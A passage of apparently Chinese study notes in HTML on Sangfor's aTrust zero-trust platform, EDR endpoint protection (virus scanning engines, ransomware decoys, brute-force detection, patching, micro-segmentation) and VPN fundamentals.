src="https://pic.imgdb.cn/item/66dd6242d9c307b7e9db12e0.png"></p><p>​用户源选择本地时，用户的账号和密码信息是保存在<strong>aTrust的数据库</strong>内。本地用户目录aTrust支持如下功能。</p><ul><li>新增组织架构，角色和用户</li><li>用户的批量导入和导出功能</li><li>精细化授权，可通过组织架构，角色和用户针对性的进行应用授权</li></ul><ol start="2"><li>用户目录管理–外部用户</li></ol><p>​外部用户可实现同步至aTrust设备本地，实现如下功能:</p><ul><li>精细化授权，可通过组织架构，角色和用户针对性的进行应用授权</li><li>LDAP（**<u>轻量级目录访问协议</u><strong>）/AD（</strong><u>活动目录</u>**）用户目录，支持立即同步和定时自动同步用户信息，支持导入安全组</li><li>企业微信用户目录，支持立即同步和定时自动同步用户信息功能</li></ul><ol start="3"><li>用户管理功能指导–本地用户、自定义本地用户</li></ol><ul><li>所有的预置条件都是：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)</li></ul><ol start="4"><li>用户管理功能指导–LDAP/AD域用户</li></ol><ul><li>预置条件：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)；控制中心(综合网关)设备与LDAP/AD认证服务器通信正常</li></ul><ol start="5"><li>用户管理功能指导–企业微信用户</li></ol><ul><li>预置条件：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)；控制中心(综合网关)设备与企业微信通信正常，同时获取了企业微信的CorpID和通讯录Secret信息</li></ul><ol start="6"><li>用户管理功能指导–钉钉用户</li></ol><ul><li>预置条件：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)；控制中心(综合网关)设备与钉钉通信正常，同时获取了认证应用的AppKey和AppSecret信息</li></ul><h4 id="4-3-4-aTrust本地认证"><a href="#4-3-4-aTrust本地认证" class="headerlink" title="4.3.4 aTrust本地认证"></a>4.3.4 aTrust本地认证</h4><h4 id="4-3-5-aTrust-LDAP认证"><a href="#4-3-5-aTrust-LDAP认证" class="headerlink" title="4.3.5 aTrust_LDAP认证"></a>4.3.5 aTrust_LDAP认证</h4><h4 id="4-3-6-aTrust-TOTP动态令牌认证"><a href="#4-3-6-aTrust-TOTP动态令牌认证" class="headerlink" title="4.3.6 aTrust_TOTP动态令牌认证"></a>4.3.6 aTrust_TOTP动态令牌认证</h4><h4 id="4-3-7-aTrust证书认证"><a href="#4-3-7-aTrust证书认证" class="headerlink" title="4.3.7 aTrust证书认证"></a>4.3.7 aTrust证书认证</h4><h4 id="4-3-8-aTrust腾讯云阿里云短信认证"><a href="#4-3-8-aTrust腾讯云阿里云短信认证" class="headerlink" title="4.3.8 aTrust腾讯云阿里云短信认证"></a>4.3.8 aTrust腾讯云阿里云短信认证</h4><h4 id="4-3-9-aTrust自定义HTTP-S-短信认证"><a href="#4-3-9-aTrust自定义HTTP-S-短信认证" class="headerlink" title="4.3.9 aTrust自定义HTTP(S)短信认证"></a>4.3.9 aTrust自定义HTTP(S)短信认证</h4><h4 id="4-3-10-aTrust-Radius账号认证"><a href="#4-3-10-aTrust-Radius账号认证" class="headerlink" title="4.3.10 aTrust_Radius账号认证"></a>4.3.10 aTrust_Radius账号认证</h4><h4 id="4-3-11-aTrust-Web应用"><a href="#4-3-11-aTrust-Web应用" class="headerlink" title="4.3.11 aTrust_Web应用"></a>4.3.11 aTrust_Web应用</h4><h4 id="4-3-12-aTrust权限管理"><a href="#4-3-12-aTrust权限管理" class="headerlink" title="4.3.12 aTrust权限管理"></a>4.3.12 aTrust权限管理</h4><h4 id="4-3-13-aTrust隧道应用"><a href="#4-3-13-aTrust隧道应用" class="headerlink" title="4.3.13 aTrust隧道应用"></a>4.3.13 aTrust隧道应用</h4><h4 id="4-3-14-aTrust安全基线"><a href="#4-3-14-aTrust安全基线" class="headerlink" title="4.3.14 aTrust安全基线"></a>4.3.14 aTrust安全基线</h4><h4 id="4-3-15-aTrust策略管理"><a href="#4-3-15-aTrust策略管理" class="headerlink" title="4.3.15 aTrust策略管理"></a>4.3.15 aTrust策略管理</h4><h4 id="4-3-16-aTrust自适应认证"><a href="#4-3-16-aTrust自适应认证" class="headerlink" title="4.3.16 aTrust自适应认证"></a>4.3.16 aTrust自适应认证</h4><h4 id="4-3-17-aTrust免认证应用"><a href="#4-3-17-aTrust免认证应用" class="headerlink" title="4.3.17 aTrust免认证应用"></a>4.3.17 aTrust免认证应用</h4><h4 id="4-3-18-aTrust-对接CAS票据认证"><a href="#4-3-18-aTrust-对接CAS票据认证" class="headerlink" title="4.3.18 aTrust_对接CAS票据认证"></a>4.3.18 aTrust_对接CAS票据认证</h4><h4 id="4-3-19-aTrust-OAuth2票据认证"><a href="#4-3-19-aTrust-OAuth2票据认证" class="headerlink" title="4.3.19 aTrust_OAuth2票据认证"></a>4.3.19 aTrust_OAuth2票据认证</h4><h4 id="4-3-20-aTrust系统升级"><a href="#4-3-20-aTrust系统升级" class="headerlink" title="4.3.20 aTrust系统升级"></a>4.3.20 aTrust系统升级</h4><h4 id="4-3-21-aTrust配置备份与SNMP管理"><a href="#4-3-21-aTrust配置备份与SNMP管理" class="headerlink" title="4.3.21 aTrust配置备份与SNMP管理"></a>4.3.21 aTrust配置备份与SNMP管理</h4><h4 id="4-3-22-aTrust平台安装部署"><a href="#4-3-22-aTrust平台安装部署" class="headerlink" title="4.3.22 aTrust平台安装部署"></a>4.3.22 aTrust平台安装部署</h4><h4 id="4-3-23-aTrust平台网络配置与授权"><a href="#4-3-23-aTrust平台网络配置与授权" class="headerlink" title="4.3.23 aTrust平台网络配置与授权"></a>4.3.23 aTrust平台网络配置与授权</h4><h4 id="4-3-24-零信任网络安全架构"><a href="#4-3-24-零信任网络安全架构" class="headerlink" title="4.3.24 零信任网络安全架构"></a>4.3.24 零信任网络安全架构</h4><h3 id="第四部分-终端安全原理与运维"><a href="#第四部分-终端安全原理与运维" class="headerlink" title="第四部分 终端安全原理与运维"></a>第四部分 终端安全原理与运维</h3><h4 id="4-4-1-EDR安装部署"><a href="#4-4-1-EDR安装部署" class="headerlink" title="4.4.1 EDR安装部署"></a>4.4.1 EDR安装部署</h4><p>EDR（终端安全检测响应系统）</p><ol><li>总体架构</li></ol><p>​EDR从系统架构上分为三层，基础平台层、核心引擎层以及功能展现层</p><ul><li>基础平台层:负责提供集中管控，云查以及主机代理功能的基础能力。</li><li>核心引擎层:负责提供病毒检测，威胁分析以及行为检测等能力。</li><li>功能展现层:从预防、防御、检测、响应等四个方面，提供全面的安全防护体系。</li></ul><p><img src="https://pic.imgdb.cn/item/66dd7225d9c307b7e9f506eb.png"></p><ol start="2"><li>部署结构</li></ol><p>​EDR从部署结构上分为云端、管理端(MGR)和客户端(Agent)三部分。</p><ul><li>云端:包括病毒库升级、云端查杀服务中心、安全情报中心。</li><li>管理端:负责维护管理所有的Agent客户端。</li><li>客户端:安装在终端的软件，对终端进行安全防护，</li></ul><img src="https://pic.imgdb.cn/item/66dd72f2d9c307b7e9f5e061.png" style="zoom: 67%;"><ol start="3"><li><p>MGR(管理端)部署</p><ul><li><p>兼容性确认</p></li><li><p>硬件要求确认</p></li><li><p>网络连通性确认</p><ul><li>客户端(Agent)与管理平台(MGR)通信使用到TCP:4430、TCP:8083、TCP:54120端口、ICMP。确保端口连通性。<ul><li>4430端口:Agent组件更新和病毒库更新。</li><li>8083端口:Agent和管理端业务通信端口。</li><li>54120端口:逃生端口，应急情况与Agent通信端口。完成Agent重启、卸载和脚本执行命令下发。</li><li>ICMP:连通性探测</li></ul></li></ul></li></ul><ol><li><p>软件部署</p><ul><li>ISO镜像部署</li></ul><p> <img src="https://pic.imgdb.cn/item/66dd7eead9c307b7e90a79e4.png"></p><ul><li>OVA模板部署</li></ul></li><li><p>硬件一体机部署</p></li></ol><p> <img src="https://pic.imgdb.cn/item/66dd7ff2d9c307b7e90b99a6.png"></p></li><li><p>客户端Agent部署</p></li></ol><ul><li>部署方式(5种):安装包部署、网页推广部署、AC联动部署、虚拟机模板部署、域控场景部署</li></ul><p><img src="https://pic.imgdb.cn/item/66dd90ddd9c307b7e926d6f9.png"></p><h4 id="4-4-2-EDR终端管理"><a href="#4-4-2-EDR终端管理" class="headerlink" title="4.4.2 EDR终端管理"></a>4.4.2 EDR终端管理</h4><ol><li>终端管理–需求背景</li></ol><p>​内网电脑数量多，不同部门电脑系统版本不一样、不同终端类型需要配置的安全策略也不一样，管理员缺少一种对全网电脑进行管理的方式、给运维带来不便。</p><p>​EDR终端分组是<strong>树形组织结构</strong>，能根据客户不同需求对终端进行灵活分组，如按<strong>业务部门</strong>、按<strong>终端类型</strong>(客户端和服务器)等进行分组，并且可以对各个分组配置个性化的安全策略，从而做到内网众多电脑进行分类管理、方便运维。</p><ol start="2"><li>终端清点–需求背景</li></ol><p>​终端清点功能能够帮助管理员看清全网主机资产全貌，理清全网主机风险暴露面，从而削减全网主机攻击面。</p><p>​终端清点是由EDR客户端读取<strong>终端操作系统信息</strong>、<strong>已安装的应用软件信息</strong>、<strong>开放的监听端口信息</strong>、<strong>终端的系统账户信息和终端硬件信息</strong>，上报给EDR管理平台进行集中展示和分析</p><p><img src="https://pic.imgdb.cn/item/66dd95b1d9c307b7e93439e1.png"></p><p>应用场景：</p><p>（1）全网非授权软件使用统计</p><p>（2）全网主机风险账户梳理</p><p>（3）统一封堵风险端口</p><ol start="3"><li>终端发现–需求背景</li></ol><p>​终端电脑数量很多的情况下，管理员很难知道哪些终端未安装EDR客户端进行防护，从而带来潜在的安全风险。终端发现功能可以帮助管理员发现内网没有安装EDR客户端的电脑，及时做好安全防护，降低风险暴露面。</p><p>原理：</p><p>​EDR集成了Nmap扫描工具实现终端发现功能。管理员触发内网扫描(Nmap扫描)对内网终端进行活跃探测，扫描返回结果中的IP说明主机是活跃的，EDR将活跃的主机IP和EDR管理平台中在线的终端IP比较，得出EDR管理平台中不存在的活跃主机，即为未安装EDR客户端的终端。</p><ol start="4"><li>终端基线检查–需求背景</li></ol><p>​信息安全等级保护标准已经成为国内企业信息安全建设的标准。国家规定，有些行业(如金融、教育、能源、电商等)是有要求自己的信息安全建设过等保测评的。等保从物理安全、网络安全、主机安全、应用安全、数据安全、安全管理等方面对信息安全建设都做了相应的规范要求。<br>​如果客户业务系统需要准备等保测评，那么业务系统当前安全状态与等保安全要求之间的差距在哪里，需要帮助客户梳理出来，进行整改。EDR的基线检查功能是根据三级等保合规性要求对windows和linux系统进行合规性检查，帮助客户发现内网不合规终端及不合规项并提供加固整改建议。</p><p>功能:</p><p>对以下安全策略进行合规性检查</p><ul><li>身份鉴别策略组检测</li><li>访问控制策略组检测</li><li>安全审计策略组检测</li><li>剩余信息保护策略组检测</li><li>入侵防范检测</li></ul><p><img src="https://pic.imgdb.cn/item/66dd9a6cd9c307b7e93ad4a9.png"></p><ol start="5"><li>远程协助</li></ol><p>原理:</p><p>​基于远程控制开源软件UItraVNC(分为客户端和服务端)，EDR客户端默认附带UItraVNC服务端程序。通过在EDR管理平台发起远程，下载运行UItraVNC客户端程序，输入被远程端的IP、端口以及授权码即可实现远程控制。</p><p>注意事项:</p><p><img src="https://pic.imgdb.cn/item/66dd9c20d9c307b7e93d216a.png"></p><h4 id="4-4-3-EDR策略中心"><a href="#4-4-3-EDR策略中心" class="headerlink" title="4.4.3 EDR策略中心"></a>4.4.3 EDR策略中心</h4><ol><li>需求背景</li></ol><p>客户选择EDR是为了给终端提供一套完整的安全解决方案，保护内网服务器和PC的安全。EDR提供基本策略、病毒查杀、实时防护、安全加、信任名单和漏洞修复等安全策略帮助用户保护内网主机安全。</p><h5 id="一、病毒查杀"><a href="#一、病毒查杀" class="headerlink" title="一、病毒查杀"></a>一、病毒查杀</h5><p><img src="https://pic.imgdb.cn/item/66fa912df21886ccc0e13d27.png"></p><p>功能介绍：漏斗式，从上到下依次进行，一旦上层发现有问题就继续交给下层</p><p><img src="https://pic.imgdb.cn/item/66fa9183f21886ccc0e19bf8.png"></p><p>文件信誉检测引擎：</p><p><img src="https://pic.imgdb.cn/item/66fa9269f21886ccc0e2c6b2.png"></p><p>基因特征检测引擎：提取基因，处理病毒家族</p><p><img src="https://pic.imgdb.cn/item/66fa9303f21886ccc0e3c00b.png"></p><p>人工智能检测引擎：</p><p><img src="https://pic.imgdb.cn/item/66fa9394f21886ccc0e46473.png"></p><p><img src="https://pic.imgdb.cn/item/66fa9419f21886ccc0e4e5af.png"></p><p>行为分析检测引擎：</p><p><img src="https://pic.imgdb.cn/item/66fa9463f21886ccc0e5401e.png"></p><p>安全云脑检测引擎：</p><p><img src="https://pic.imgdb.cn/item/66fa94fcf21886ccc0e5e7b2.png"></p><p>配置步骤:</p><ul><li><p>配置病毒查杀策略</p></li><li><p>下发病毒查杀扫描</p></li><li><p>对病毒查杀结果进行处置</p></li></ul><ol><li>病毒查杀策略</li></ol><ul><li>病毒查杀发现威胁文件后的三种处理动作<ul><li>标准处置:**<u>默认配置为标准处置</u>**。根据病毒的类型和威胁程度，按系统预定义的处置方式对威胁文件进行处置(确认是病毒的自动隔离，可疑病毒的仅上报不隔离，由人工进一步分析处理)</li><li>严格处理:**<u>适用于严格保护场景，可能会存在一定误判</u>**。EDR检测的所有威胁文件均隔离处理。</li><li>仅上报不处置:**<u>适用于有人值守且用户了解如何处置病毒的场景，需要人工分析上报的威胁日志进行处理</u>**。EDR检测的所有威胁文件仅上报安全日志，不隔离。</li></ul></li><li>扫描引擎默认没有启用<strong>行为引擎</strong>，如果电脑配置在CPU 4核、内存 4G以上可以启用所有引擎，低于此配置，建议保留默认配置。</li><li>“开启高启发式扫描”后会提高病毒检出率，但也会增加误判，此配置项在多家厂商PK测试病毒检测率时使用，非此场景慎用。</li></ul><ol start="2"><li>病毒处置</li></ol><p>如果病毒查杀策略设置发现恶意文件的处置动作为“标准处置”或“仅上报，不处置”，则病毒查杀发现的威胁文件(未自动隔离的)可以由人工进行“处置”、“信任”和“忽略”处理</p><ul><li>处置:对感染性病毒、宏病毒文件先进行修复，无法修复再进行隔离处理:其它类型病毒直接隔离。</li><li>信任:如果检测出的威胁为正常文件，则可以添加为可信任。</li><li>忽略:如果威胁在终端已自行处理，管理端不需要显示威胁日志，则可以设置为忽略。</li><li>威胁分析:接入深信服安全中心，对威胁事件详细分析，进一步判断威胁文件影响。</li></ul><ol start="3"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66fa97cdf21886ccc0e89ff6.png"></p><h5 id="二、文件实时监控"><a href="#二、文件实时监控" class="headerlink" title="二、文件实时监控"></a>二、文件实时监控</h5><ol><li>需求背景</li></ol><p>为了保护业务安全，不仅要做到威胁发生后对威胁事件的及时检测与响应，更需要在威胁发生前进行相应预防和威胁发生的过程中做好相应的防护策略。这样才能在保护业务安全方面提供事前预防、事中防护、事后检测和响应的闭环解决方案。此次培训主要介绍在事中防护阶段文件实时监控如何保护业务安全。</p><ol start="2"><li>功能介绍</li></ol><p>文件实时监控使用SAVE人工智能引擎、基因特征引擎、云查引擎等多种引擎，实时监控电脑上文件写入、读取和执行操作，当检测到威胁文件写入、读取、执行时，立即阻断相关操作，并进行告警。防止威胁文件落地、并进一步执行，从而保护业务安全</p><ol start="3"><li>原理介绍</li></ol><p><img src="https://pic.imgdb.cn/item/66fa9904f21886ccc0e9d7d6.png"></p><ol start="4"><li>配置介绍</li></ol><ul><li>防护级别<ul><li>高：监控文件打开、执行、落地动作</li><li>中：监控文件执行、落地动作</li><li>低：监控文件执行动作</li></ul></li><li>扫描引擎<ul><li>电脑性能足够，扫描引擎可以全开;性能不足，建议关闭基因特征引擎</li></ul></li><li>发现恶意文件后的处置动作<ul><li>标准处置:默认配置为标准处置。根据病毒的类型和威胁程度，按系统预定义的处置方式对威胁文件进行处置(确认是病毒的自动隔离，可疑病毒的仅上报不隔离，由人工进一步分析处理)</li><li>严格处理:适用于严格保护场景，可能会存在一定误判。EDR检测的所有威胁文件均隔离处理。</li><li>仅上报不处置:适用于有人值守且用户了解如何处置病毒的场景需要人工分析上报的威胁日志进行处理。EDR检测的所有威胁文件仅上报安全日志，不隔离。</li></ul></li></ul><ol start="5"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66fa9a1af21886ccc0ead11a.png"></p><h5 id="三、勒索诱饵防护"><a href="#三、勒索诱饵防护" class="headerlink" title="三、勒索诱饵防护"></a>三、勒索诱饵防护</h5><ol><li>功能介绍</li></ol><p>​EDR在勒索病毒经常加密的目录按照**<u>投放规则投放诱饵文件</u><strong>(文本文件、pdf、图片等)</strong><u>并实时监控诱饵文件是否被修改</u>**。如果电脑感染勒索病毒，勒索病毒会遍历目录下的所有文件并对文件进行加密(勒索防护功能够按一定算法确保诱饵文件先被勒索病毒读取)，当EDR检测到诱饵文件被修改时，EDR客户端及时进行报警拦截，从而更早更及时地发现和清除未知勒索病毒，避免终端系统文件或业务文件被加密。</p><ol start="2"><li>原理介绍</li></ol><p><img src="https://pic.imgdb.cn/item/66fa9c7bf21886ccc0ed2929.png"></p><p><img src="https://pic.imgdb.cn/item/66fa9cfff21886ccc0edab18.png"></p><ol start="3"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66fa9da1f21886ccc0ee5d7e.png"></p><h5 id="四、暴力破解检测"><a href="#四、暴力破解检测" class="headerlink" title="四、暴力破解检测"></a>四、暴力破解检测</h5><ol><li>需求背景</li></ol><p>安全事件的发生，绝大多数都是因为黑客先拿到了内网控制权限，再植入了病毒。黑客拿到内网权限的方法常见有暴力破解入侵、漏洞利用等。所以攻击过程中，如果能够实时检测暴力破解行为，并加以阻止，就能够阻止黑客通过暴力破解入侵内网，从而保护内网安全。</p><ol start="2"><li>功能介绍</li></ol><p>暴力破解是指攻击者使用用户名和密码字典，一个一个去枚举，尝试入侵服务器。理论上来说，只要字典足够庞大，枚举总是能够成功的。爆破的类型有很多，**<u>EDR支持Windows的RDP、SMB爆破检测，以及Linux的SSH爆破检测。</u>**</p><ol start="3"><li>原理介绍</li></ol><p>EDR支持Windows的RDP、SMB爆破检测，以及Linux的SSH爆破检测。<br>通过**<u>读取Windows和Linux系统登录日志</u>**，检测在一分钟时间内同一个用户登录系统的次数或同个IP不同用户登录系统的次是否达到阀值，达到阀值则判定为爆破，进行封锁或上报日志。</p><ol start="4"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66faa4bdf21886ccc0f55938.png"></p><h5 id="五、安全加固"><a href="#五、安全加固" class="headerlink" title="五、安全加固"></a>五、安全加固</h5><ol><li>功能介绍</li></ol><p>为了保护服务器或服务器重要目录不被勒索或不受恶意威胁影响，安全加固功能可以**<u>只允许可信进程(EDR自动学习或手动添加)在服务器运行或访问服务器重要目录，不可信进程无法在服务器运行</u><strong>，从而保护服务器或服务器重要目录，有效阻止未知勒索病毒等威胁对服务器的影响。</strong>此功能只适用Windows Server，不适用Windows PC和Linux系统。**</p><ol start="2"><li>原理介绍</li></ol><p>EDR客户端实时监控不可信进程是否在受保护的服务器运行、不可信进程是否访问服务器重要目录，当检测到存在不可信进程时，立即停止运行或停止访问服务器重要目录。</p><ol start="3"><li>适用场景</li></ol><ul><li><p>适用于保护运行稳定的服务器系统，阻止不可信进程(如勒索病毒等恶意病毒)在服务器运行，从而达到保护服务器安全的目的。</p></li><li><p>适用于针对服务器的<strong>重要目录</strong>进行防护，避免重要目录及其文件被勒索病毒等进行非法篡改/获取。</p></li></ul><h5 id="六、漏洞修复"><a href="#六、漏洞修复" class="headerlink" title="六、漏洞修复"></a>六、漏洞修复</h5><ol><li>需求背景</li></ol><p>​漏洞利用是攻击者常用的攻击手段，如著名的WannaCry勒索病毒事件正是利用了MS17-010漏洞(永恒之蓝)实施的入侵，给全球用户造成了无法估计的损失。与此同时内网终端多，漏洞修复过程复杂、周期长。正因为如此，急需一种工作能够在预防阶段集中批量、方便检测终端系统漏洞，并进行修复，防止攻击者通过漏洞入侵。</p><ol start="2"><li>功能介绍</li></ol><p>​EDR通过<strong>管理平台集中管理内网所有终端</strong>能够批量检测内网windows系统漏洞，并进行<strong>批量修复</strong>。通过管中管管理、批量检测与修复，使漏洞修复工作更简单、周期更短。</p><ol start="3"><li>原理介绍</li></ol><ul><li>漏洞修复过程两阶段：漏洞检测、漏洞修复<ul><li>漏洞检测<ul><li>漏洞库更新：云脑定期更新微软当前发布的漏洞补丁信息，EDR获取对应漏洞的检测规则发布到CDN，MGR从CDN更新漏洞规则为库，Agent从管理平台更新漏洞规则库。</li><li>漏洞检测：MGR<a href="%E7%BB%84%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86">^1</a>下发漏洞扫描检测指令到Agent，Agent收到漏洞检查任务后，开始检查(根据漏洞规则库与电脑漏洞进行匹配)，并将检查结果上报给管理平台。</li></ul></li><li>漏洞修复<ul><li>管理平台下发漏洞修复指令到Agent，Agent收到漏洞修复任务后，从漏洞补丁服务器(CDN、微软补丁服务器、EDR管理平台、客户自建补丁服务器)下载漏洞补丁进行修复，修复结果上报管理平台。</li></ul></li></ul></li></ul><h5 id="七、轻补丁漏洞免疫"><a href="#七、轻补丁漏洞免疫" class="headerlink" title="七、轻补丁漏洞免疫"></a>七、轻补丁漏洞免疫</h5><ol><li>需求背景</li></ol><p>​漏洞利用攻击在当前热点威胁中拥有最高的使用率，通过打补丁修复漏洞成为众多企业级用户的首选方案。然而，传统的漏洞修复方法在①补丁未及时发布(0day漏洞)②微软停止提供漏洞修补支持(Win7等停更系统)③漏洞修复导致重启等场景下，已不能提供快速有效的防护能力，企业用户的终端存在很大的安全隐患。</p><p>​轻补丁漏洞免疫，<strong>直接在内存里对有漏洞的代码进行修复</strong>，无需下载补丁重启电脑，快速修复，对业务系统“零”干扰。</p><ol start="2"><li>原理介绍</li></ol><p>​<u>传统的漏洞修复</u>大致分为3个过程:</p><ul><li>首先，根据漏洞规则定位到有BUG的系统原文件</li><li>其次，将<strong>系统原文件替换成新的已修复文件</strong></li><li>最后，重启系统进程将新的代码读入内存中运行</li></ul><p>该方案一方面需要将补丁替换到磁盘并重启生效，<strong>存在中断业务的困扰</strong>;另一个方面，安装补丁往往需要对系统进行修改，存在<strong>与现有业务系统的兼容性风险</strong>。</p><p>​<u>轻补丁漏洞免疫：</u></p><p>​为避免传统漏洞修复的弊端，轻补丁漏洞免疫通过补丁规则包匹配定位问题代码<u>内存</u>片段，直接<strong>替换问题代码完成修复</strong>，<strong>无需重新启动进程</strong>调用内存。</p><p><img src="https://pic.imgdb.cn/item/66ff9650d29ded1a8caf345d.png"></p><ol start="3"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66ff98a9d29ded1a8cb17216.png"></p><h5 id="八、终端广告弹窗拦截"><a href="#八、终端广告弹窗拦截" class="headerlink" title="八、终端广告弹窗拦截"></a>八、终端广告弹窗拦截</h5><ol><li>需求背景</li></ol><p>​终端大量软件为盈利自带广告弹窗功能，给用户的办公带来很大的干扰，特别是教育、政府行业。希望能够对终端进行一键弹窗拦截，减少垃圾信息的干扰，为用户提供一个纯净的工作环境。</p><ol start="2"><li>原理介绍</li></ol><p>​深信服EDR终端广告弹窗拦截是由客户端UI加载弹窗拦截的插件，实时对当前桌面所有的窗口进行扫描，<strong>匹配本地的弹窗拦截规则</strong>，若匹配上则进行拦截，并记录拦截日志;其中拦截规则可云端在线更新。</p><ol start="3"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66ff9c3ed29ded1a8cb48fac.png"></p><h4 id="4-4-4-EDR微隔离"><a href="#4-4-4-EDR微隔离" class="headerlink" title="4.4.4 EDR微隔离"></a>4.4.4 EDR微隔离</h4><ol><li>需求背景</li></ol><p>​客户端与业务服务器、服务器与服务器之间访问关系复杂，无法看清之间的访问关系、无法基于访问关系配置访问控制策略，从而给服务器安全带来隐患，加大安全管理难度。</p><p>​<strong><u>微隔离是一种集中化的流量识别和管理技术。</u></strong></p><p>​在东西向访问关系控制上，能够基于访问关系进行访问控制策略配置，集中统一管理服务器的访问控制策略，减少了对物理、虚拟的服务器被攻击的机会。</p><p>​在访问关系可视化中，采用统一管理的方式对终端的网络访问关系进行图形化展示，可以看到每个业务域内部各个终端的访问关系展示以及访问记录</p><ol start="2"><li>访问关系控制</li></ol><p>​在东西向访问关系控制上，优先对所有的服务器进行<strong>业务安全域的逻辑划域隔离</strong>，并对业务区域内的服务器提供的服务进行应用角色划分，对不同应用角色之间服务访问进行访问控制配置，减少了对物理、虚拟的服务器被攻击的机会，集中统一管理服务器的访问控制策略。并且基于安装轻量级主机Agent软件的访问控制，不受虚拟化平台的影响，不受物理机器和虚拟机器的影响。</p><p><img src="https://pic.imgdb.cn/item/66ff9e58d29ded1a8cb6765b.png"></p><ol start="3"><li>访问关系可视化</li></ol><p>​在访问关系可视化中，采用统一管理的方式对终端的网络访问关系进行图形化展示，可以看到每个业务域内部各个终端的访问关系展示以及访问记录。</p><ol start="4"><li>原理介绍（<strong>终端本机装防火墙</strong>）</li></ol><p>​微隔离使用Windows防火墙WFP和Linux防火墙iptables进行访问流量控制和上报的<br>​如下图为微隔离整体流程s图，先在MGR下发微隔离策略，此时终端会根据配置的微隔离策略设置终端电脑防火墙规则。当终端发送请求时，系统会根据要访问的IP地址、端口、协议等来解析请求，然后与防火墙规则进行匹配，允许则放通，不允许则直接丢弃。</p><p><img src="https://pic.imgdb.cn/item/66ffd0aad29ded1a8ce49dad.png"></p><ol start="5"><li>微隔离使用</li></ol><p>配置思路：四个步骤</p><p>（1）业务系统梳理</p><ul><li>根据客户需求梳理客户业务系统/IP/角色/服务及各对象之间的<strong>访问关系</strong>，为后面的微隔策略做准备</li></ul><p>（2）定义对象</p><ul><li>根据第1步梳理的内容，定义业务系统/IP组/服务等<strong>对象</strong>，为微隔离策略调用</li></ul><p>（3）配置微隔离策略</p><ul><li>根据第1步梳理的访问关系和第3步定义的业务系统/IP组/服务，配置<strong>微隔离</strong><br>  <strong>策略</strong>。</li></ul><p>（4）效果验证</p><ol start="6"><li>案例-防止感染病毒蔓延场景</li></ol><p><img src="https://pic.imgdb.cn/item/66ffd27ad29ded1a8ce64246.png"></p><h4 id="4-4-5-终端安全产品介绍"><a href="#4-4-5-终端安全产品介绍" class="headerlink" title="4.4.5 终端安全产品介绍"></a>4.4.5 终端安全产品介绍</h4><h4 id="4-4-6-AIO功能介绍"><a href="#4-4-6-AIO功能介绍" class="headerlink" title="4.4.6 AIO功能介绍"></a>4.4.6 AIO功能介绍</h4><h3 id="第五部分-广域网组网与传输安全"><a href="#第五部分-广域网组网与传输安全" class="headerlink" title="第五部分 广域网组网与传输安全"></a>第五部分 广域网组网与传输安全</h3><h4 id="4-5-1-VPN概述"><a href="#4-5-1-VPN概述" class="headerlink" title="4.5.1 VPN概述"></a>4.5.1 VPN概述</h4><ol><li>VPN需求背景</li></ol><ul><li>企业、组织、商家等对专用网有强大的需求。</li><li>高性能、高速度和高安全性是专用网明显的优势</li><li>物理专用网价格高昂，物理架设实施有难度。传统的通过租用专线或拨号网络的方式越来越不适用。(性价比较低)</li><li>TCP/IP 协议簇本身的局限性，不能保证信息直接传输的保密性。TCP/IP协议在设计之初是基于可信环境的，没有考虑安全问题，所以在TCP/IP协议簇本身存在许多固有的安全缺陷。</li></ul><p>总结两点：对专用网的需求增加、物理专用网架设性价比低</p><ol start="2"><li>VPN概述</li></ol><p>​VPN定义(VitualPrivate Network，虚拟私有网):是指依靠ISP或其他NSP在公用网络基础设施之上构建的专用的安全数据通信网络，只不过这个专线网络是逻辑上的而不是物理的，所以称为虚拟专用网。</p><p>虚拟：用户不再需要拥有实际的长途数据线路，而是使用公共网络资源建立自己<br>的私有网络。</p><p>专用：用户可以定制最符合自身需求的网络。</p><p>核心技术：隧道技术</p><ol start="3"><li><p>VPN分类</p><ol><li>按业务分类</li></ol><p> （1）Client-LAN VPN（Access VPN）</p><ul><li>使用基于Internet远程访问的 VPN</li><li>出差在外的员工、有远程办公需要的分支机构，都可以利用这种类型的VPN，实现对<br>  企业内部网络资源进行安全地远程访问。</li></ul><p> <img src="https://pic.imgdb.cn/item/66e05f68d9c307b7e97da0e9.png"></p><p> （2）LAN-LAN VPN</p><ul><li>为了在不同局域网络之间建立安全的数据传输通道，例如在企业内部各分支机构之间或者企业与其合作者之间的网络进行互联，则可以采用LAN-LAN 类型的VPN。</li></ul><p> <img src="https://pic.imgdb.cn/item/66e06010d9c307b7e980247e.png"></p><ol start="2"><li>按网络层次分类</li></ol><p> <img src="https://pic.imgdb.cn/item/66e06094d9c307b7e982080b.png"></p></li><li><p>VPN常用技术</p></li></ol><ul><li>隧道技术</li><li>加解密技术</li><li>身份认证技术</li></ul><h5 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h5><p>隧道：是在公共通信网络上构建的一条数据路径，可以提供与专用通信线路等同的连接特性。<br>隧道技术：是指在隧道的两端通过封装以及解封装技术在公网上建立一条数据通道，使用这条通道对数据报文进行传输。隧道是由隧道协议构建形成的。隧道技术是VPN技术中最关键的技术。</p><p><img src="https://www.helloimg.com/i/2024/12/15/675db63346596.png"></p><ul><li>多种隧道技术对比</li></ul><p><img src="https://www.helloimg.com/i/2024/12/15/675db6d7d8118.png"></p><p>目前使用最多的市IPSec和SSL VPN，Intranet VPN和Extranet VPN场景多用IPSec，而Access VPN多用SSL VPN</p><h5 id="加解密技术"><a href="#加解密技术" class="headerlink" title="加解密技术"></a>加解密技术</h5><p>目的：即使信息被窃听或者截取，攻击者也无法知晓信息的真实内容。可以对抗网络攻击中的被动攻击。</p><p>通常使用加密机制来保护信息的保密性，防止信息泄密。信息的加密机制通常是建立在密码学的基础上。</p><ul><li>常见对称加密算法</li></ul><p><img src="https://www.helloimg.com/i/2024/12/15/675db95a47733.png"></p><ul><li>对称算法的缺陷</li></ul><p><img 